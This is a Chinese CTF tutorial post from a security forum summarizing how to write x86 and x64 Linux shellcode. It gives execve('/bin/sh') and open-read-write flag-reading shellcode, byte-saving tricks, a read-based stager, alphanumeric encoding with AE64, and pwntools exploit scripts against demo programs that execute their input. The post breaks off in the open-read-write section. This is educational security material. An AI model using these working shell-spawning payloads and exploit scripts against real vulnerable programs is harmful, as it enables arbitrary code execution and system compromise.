---
title: x86_shellcode的一些总结
url: https://forum.butian.net/share/4045
source: 奇安信攻防社区
date: 2025-01-17
fetch_date: 2025-10-06T20:04:32.907136
---

# x86_shellcode的一些总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### x86\_shellcode的一些总结

* [CTF](https://forum.butian.net/topic/52)

本文章会涉及到各种shellcode的原理和撰写，然后还有可见字符串漏洞的撰写和原理，以及工具梭哈和 一些针对不同orw情况的模板shellcode

用汇编语言构造简单的shellcode（32位）
========================
\*\*再压入参数'flag'的时候，32位的需要提前压入00用来截断字符串\*\*
前置知识：
①对于32位程序而言，我们最后系统调用采用的并不是syscall，而是int 0x80
②我们传参的前三个寄存器分别是ebx,ecx,edx
③32位的execve系统调用号是11，并且存储系统调用后的寄存器是eax。32位的系统调用号可以查看这个文件/usr/include/x86\\_64-linux-gnu/asm/unistd\\_32.h
/bin/sh get shell的shellcode手搓逻辑
-------------------------------
eax,ebx,ecx 这样传参顺序 execve(/bin/sh),ebx为/bin/sh或者/bin//sh 效果是一样的 因为是在32位 一般用/bin//sh 刚好两个四字节
```assembly
xor ecx, ecx
xor edx, edx
xor ebx, ebx
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor eax, eax
push 11
pop eax
int 0x80
```
ORW的shellcode 手搓逻辑
------------------
### open
```c
int open(const char \*pathname, int flags, mode\_t mode);
```
- \*\*`eax`\*\*: 系统调用号（`open` 的系统调用号为 5）。
- \*\*`ebx`\*\*: `pathname` - 文件路径的指针。一定要是指针 也就是地址 那么 `push 0x67616c66 push esp pop ebx`
- \*\*`ecx`\*\*: `flags` - 打开模式的标志。
- \*\*`edx`\*\*: `mode` - 文件权限，通常在创建文件时使用。
```assembly
push 0
push 0x67616c66
push esp
pop ebx
xor ecx, ecx
push 5
pop eax
int 0x80
```
### read
```c
ssize\_t read(int fd, void \*buf, size\_t count);
```
- \*\*`eax`\*\*: 系统调用号（`read` 的系统调用号为 3）。
- \*\*`ebx`\*\*: `fd` - 文件描述符。
- \*\*`ecx`\*\*: `buf` - 缓冲区的指针。
- \*\*`edx`\*\*: `count` - 读取的字节数。
```assembly
push rax ; open后rax为3
pop ebx
push esp
pop ecx
push len
pop edx
push 3
pop eax
int 0x80
```
### write
```c
ssize\_t write(int fd, const void \*buf, size\_t count);
```
- \*\*`eax`\*\*: 系统调用号（`write` 的系统调用号为 4）。
- \*\*`ebx`\*\*: `fd` - 文件描述符。
- \*\*`ecx`\*\*: `buf` - 缓冲区的地址。
- \*\*`edx`\*\*: `count` - 要写入的字节数。
```assembly
push 1
pop ebx
push esp
pop ecx
push 0x50
pop edx
push 4
pop eax
int 0x80
```
用汇编语言构造简单的shellcode（64位）
========================
前置知识
----
### 汇编
shellcode是一段机器码，通过漏洞程序产生的非法执行造成泄露、提权，getshell等危害，不过通常我们都是通过编译汇编语言来得到对应机器码，所以这里介绍一些写shellcode常用的基本的汇编指令（以x86\\_64汇编为例）
- `pop 寄存器名` --&gt;将栈中的下一个4/8字节数的地址弹入对应寄存器中
- `push 数字或寄存器` --&gt;将对应数字、寄存器中的值压入栈中
- `mov 寄存器a, (数字或寄存器)` --&gt; 将对应数字或寄存器中的值赋值给寄存器a
- `xor 寄存器a, (数字或寄存器)` --&gt; 将对应数字或寄存器中的值与寄存器a中的值进行异或并将结果存在寄存器a中
- `add 寄存器a, (数字或寄存器)` --&gt; 将对应数字或寄存器中的值与寄存器a中的值进行相加并将结果存在寄存器a中
- `sub 寄存器a, (数字或寄存器)` --&gt; 将对应数字或寄存器中的值与寄存器a中的值进行相减并将结果存在寄存器a中
- `syscall` --&gt;x64系统调用命令（机器码为'\\x0f\\x05'）
- `int 0x80` --&gt;x86系统调用命令
- `ret` --&gt;相当于pop eip
1. 直接参与系统调用的寄存器：
- RAX、RDI、RSI、RDX、R10、R8、R9
其中 `rax` 是作为 `syscall` 调用时的系统调用号，调整 `rax` 的值以调用不同的系统函数。
剩下6个寄存器按顺序作为系统调用函数的第n个参数。
2. 间接参与系统调用的寄存器
- RSP、RBP、RIP
`RSP` 和 `RBP` 作为栈顶栈底指针寄存器在 `pop` 和 `push` 指令的调用上起着重要作用。
`RIP` 则是指令指针寄存器通过其进行指令运行。
3. 基本不参与系统调用的寄存器
- RBX、R11、R12、R13、R14、R15
他们的作用大概仅限于传值。
shellcode编写
-----------
demo1：
```c
#include<stdio.h>
#include<stdlib.h>
int main()
{
void \*p = mmap(0x20240000, 0x1000uLL, 7, 34, -1, 0LL);
void (\*a)(void);
puts("shellcode:");
read(0, p, 0x100);
((void (\*)(void))p)();
return 0;
}
```
exp1
```python
#!/usr/bin/python3
from pwn import \*
context.log\_level='debug'
context(os='linux', arch='amd64')
io = process('./poc1')
gdb.attach(io)
pause()
shellcode = asm('''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 59
syscall
''')
print(len(shellcode))
io.sendafter(':\n', shellcode)
io.interactive()
```
原理就是构造`execve("/bin/sh\x00", 0, 0)`。
通过 `rbp` 和 `rsp` 之间的关系把 `/bin/sh` 传入 `rdi` 中，这里关键点在 `push rbx` （因为没有存放 `/bin/sh` 字符串的地址）。
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-a685cfa30b04902be75b18ca1f461a80c416d2cc.png)
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-bd513bf4b724baa6323b040348e8e48d40fc60be.png)
再通过 `mov rdi, rsp` 的方式就可以转移到 `rdi` 上面去，接下来就是正常的传参，然后 `syscall` 调用 `execve`。
精简
--
这一段是用了0x25的字节，那么如何可以更精简一点呢？我们参考别的师傅的思路。
思路如下：
- 用`push`、`pop`连用来代替`mov`
例如 `mov rax, rdi` 可以用 `push rdi; pop rax`
因为 `push` (`pop`) 寄存器指令一般都只需要一个字节即可，加在一起也就两个字节，而 `mov` 一般都要4个字节以上。
- 用 `xor` 相同寄存器来代替 `mov 寄存器, 0`
`xor rsi, rsi` 效果等同于将 `rsi` 置零，这也是只要两三个字节即可完成并且 `xor` 32位寄存器所需汇编指令最少。
修改后
exp1.
```assembly
shellcode = asm('''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 59
pop rax
syscall
''')
```
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-f403b147e57ae7182b548199cea8aae0909aa565.png)
exp2.
```assembly
shellcode = asm('''
mov rbx, 0x0068732f6e69622f
push rbx
pop rdi
xor rsi, rsi
xor rdx, rdx
push 59
pop rax
syscall
''')
```
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-94cb13e6196f3be7f636f8fe545f8d18ef4f3db3.png)
很明显 `exp2` 的情况字节比 `exp1` 少，但是很可惜就是无法 `getshell`。这是因为 \*\*`RDI` 是 Linux x86-64 syscall 用于传递第一个参数的寄存器。在 `execve` 系统调用中，这个参数是指向要执行的文件路径的指针。\*\*
在 `exp1` 中，`RDI` 被设置为指向堆栈上的字符串地址（"/bin/sh"）。这使得当 `execve` 系统调用被执行时，它能够正确地找到要执行的文件路径。
在 `exp2` 中，`RDI` 被直接设置为 `0x0068732f6e69622f`，这只是字符串 "/bin/sh" 转换成的整数值，而不是指向字符串的内存地址。因此，当 `execve` 系统调用执行时，它尝试使用 `0x0068732f6e69622f` 作为文件路径指针，这会导致调用失败，因为显然这是一个无效的内存地址。
- - - - - -
Reread
------
`shellcode` 如果出现字节数太小的情况，可以通过写一个 `read` 系统调用进入 `shellcode` 的运行区写入更多数据，从而加载足够长度的shellcode：
```assembly
mov rdx, 37
xor rax, rax
syscall
```
这种方式需要仅12个字节。
完整示例：
```assembly
mov rdx, 37
xor rax, rax
syscall
```
然后填充之前读取的位置，加载新的shellcode：
```assembly
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 59
pop rax
syscall
```
这种是一眼就可以看出可以 `reread` 的情况，通过 `mmap` 加载得到更加灵活的shellcode。
Demo改进
------
基础代码如下，使用 `write` 来修改 `rsi` 的值：
```c
#include<stdio.h>
#include<stdlib.h>
int main()
{
void \*p = mmap(0x20240000, 0x1000uLL, 7, 34, -1, 0LL);
void \*a;
puts("shellcode:");
read(0, p, 0x100);
write(1, a, 0);
((void (\*)(void))p)();
return 0;
}
```
利用 `push rax` 和 `pop rsi` 实现 `rsi` 赋值：
```python
#!/usr/bin/python3
from pwn import \*
context.log\_level = 'debug'
context(os='linux', arch='amd64')
io = process('./poc1')
gdb.attach(io)
shellcode2 = asm('''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 59
pop rax
syscall
''')
print(len(shellcode2))
shellcode1 = asm('''
push rax
pop rsi
mov rdx, 42
xor rax, rax
xor rdi, rdi
syscall
''')
len1 = len(shellcode1)
print(len1)
print(len1 + len(shellcode2))
io.sendafter(':\n', shellcode1)
pause()
io.send(b'\x00' \* len1 + shellcode2)
io.interactive()
```
使用纯ASCII字符shellcode
-------------------
某些题目限制为可见字符的shellcode，工具使用Ae64和alpha3：
### Ae64使用：
```python
from pwn import \*
from ae64 import AE64
context.log\_level = 'debug'
context.arch = 'amd64'
p = process('./example1')
gdb.attach(p)
obj = AE64()
shellcode = asm(shellcraft.sh())
sc = obj.encode((shellcode), 'r13')
print(len(shellcode))
print(len(sc))
p.sendline(sc)
p.interactive()
```
%%% END %%%
### 更高效的编码使用：
```python
sc = obj.encode\_small((shellcode), 'r13')
```
### Demo2 - 更进阶的用法：
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <ctype.h>
typedef void (\*func)(void \*, void \*);
// AMD64 shellcode start
const char sc\_start[] = "\\x48\\x89\\xfc\\x48\\x89\\xf0..."
```
Python代码：
```python
from pwn import \*
from ae64 import AE64
context.log\_level = 'debug'
context.arch = 'amd64'
p = process('./example2')
gdb.attach(p)
pause()
obj = AE64()
sc = obj.encode\_small(asm(shellcraft.sh()), 'rax', 0x30)
print(len(sc))
p.sendline(sc)
p.interactive()
```
orwshellcode
------------
orw实际上就是连续调用open、read...